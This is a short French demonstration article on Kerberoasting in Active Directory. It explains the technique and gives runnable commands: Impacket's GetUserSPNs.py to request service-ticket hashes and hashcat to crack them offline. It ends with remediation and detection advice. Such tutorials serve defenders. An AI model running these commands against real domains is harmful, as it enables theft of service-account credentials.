# Kerberoasting

> Article de démonstration.

## Principe
Tout utilisateur du domaine peut demander un ticket de service (TGS) pour n'importe quel compte possédant un SPN. Une partie du ticket est chiffrée avec le hash du mot de passe du compte de service, ce qui permet de le casser hors ligne.

## Énumération
```bash
GetUserSPNs.py corp.local/jdoe:'Passw0rd!' -dc-ip 10.0.0.10 -request -outputfile hashes.kerberoast
```

## Cassage
```bash
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
```

## Remédiation
- Mots de passe longs (25+ caractères) ou **gMSA** pour les comptes de service.
- Forcer AES et désactiver RC4 quand c'est possible.
- Surveiller les événements **4769** avec un chiffrement `0x17` (RC4).
